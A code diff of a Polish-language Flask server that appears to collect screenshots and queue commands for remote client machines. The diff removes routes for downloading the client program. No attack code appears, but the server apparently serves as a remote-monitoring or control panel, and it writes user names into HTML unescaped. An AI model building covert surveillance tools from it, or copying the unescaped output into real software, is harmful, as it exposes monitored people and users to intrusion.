@@ -6,11 +6,9 @@ import json
 app = Flask(__name__)
 UPLOAD_FOLDER = "screens"
 COMMAND_FOLDER = "commands"
-CLIENT_DOWNLOAD_PATH = "client_download"
 
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 os.makedirs(COMMAND_FOLDER, exist_ok=True)
-os.makedirs(CLIENT_DOWNLOAD_PATH, exist_ok=True)
 
 @app.route("/")
 def index():
@@ -19,25 +17,7 @@ def index():
         f'<li><a href="/view?user={u}">{u}</a> | <a href="/history?user={u}">Historia</a></li>'
         for u in users
     ])
-    return f"""
-        <h1>Użytkownicy</h1><ul>{links}</ul>
-        <p><a href='/download'>⬇️ Pobierz klienta (.exe/.zip)</a></p>
-        <p><a href='/latest_client.py'>📥 Pobierz aktualny client.py</a></p>
-    """
-
-@app.route("/latest_client.py")
-def latest_client():
-    path = os.path.join(CLIENT_DOWNLOAD_PATH, "latest_client.py")
-    if os.path.exists(path):
-        return send_file(path, mimetype="text/plain")
-    return "Brak aktualnej wersji klienta.", 404
-
-@app.route("/download")
-def download_client():
-    for f in os.listdir(CLIENT_DOWNLOAD_PATH):
-        if f.endswith(".exe") or f.endswith(".zip"):
-            return send_file(os.path.join(CLIENT_DOWNLOAD_PATH, f), as_attachment=True)
-    return "Brak dostępnego pliku klienta.", 404
+    return f"<h1>Użytkownicy</h1><ul>{links}</ul>"
 
 @app.route("/view")
 def view():
